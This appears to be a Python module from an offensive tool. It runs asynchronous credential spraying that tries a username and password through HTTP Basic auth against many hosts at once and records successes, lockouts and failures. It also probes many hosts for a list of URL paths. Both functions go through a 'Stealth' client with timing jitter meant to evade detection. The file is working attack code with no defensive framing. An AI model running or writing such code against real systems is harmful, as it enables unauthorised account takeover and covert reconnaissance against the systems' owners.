# Python 3.11 · spray (creds | paths)
from __future__ import annotations

import asyncio
import base64
from dataclasses import dataclass, field

import httpx

from ...stealth import Stealth


@dataclass
class SprayConfig:
    targets: list[str]
    concurrency: int = 12
    per_target_timeout: float = 15.0
    stealth: Stealth = field(default_factory=Stealth)


async def spray_creds(cfg: SprayConfig, user: str, password: str) -> list[tuple[str, str]]:
    sem = asyncio.Semaphore(cfg.concurrency)
    hits: list[tuple[str, str]] = []
    creds = base64.b64encode(f"{user}:{password}".encode()).decode()

    async def one(host: str) -> None:
        async with sem:
            client = cfg.stealth.client()
            try:
                r = await client.get(host, headers={"Authorization": f"Basic {creds}"}, timeout=cfg.per_target_timeout)
                wa = {k.lower() for k in r.headers}
                if r.status_code in (200, 301, 302) and "www-authenticate" not in wa:
                    hits.append((host, "ok"))
                elif r.status_code == 401:
                    hits.append((host, "fail"))
                elif r.status_code == 429:
                    hits.append((host, "blocked"))
                else:
                    hits.append((host, "fail"))
            except httpx.HTTPError:
                hits.append((host, "error"))
            finally:
                await client.aclose()
            await cfg.stealth.jitter()

    await asyncio.gather(*(one(h) for h in cfg.targets))
    return hits


async def spray_paths(cfg: SprayConfig, paths: list[str]) -> list[tuple[str, str, int]]:
    sem = asyncio.Semaphore(cfg.concurrency)
    hits: list[tuple[str, str, int]] = []

    async def one(host: str, path: str) -> None:
        async with sem:
            client = cfg.stealth.client()
            try:
                r = await client.get(host.rstrip("/") + path, timeout=cfg.per_target_timeout)
                hits.append((host, path, r.status_code))
            except httpx.HTTPError:
                hits.append((host, path, 0))
            finally:
                await client.aclose()
            await cfg.stealth.jitter()

    await asyncio.gather(*(one(h, p) for h in cfg.targets for p in paths))
    return hits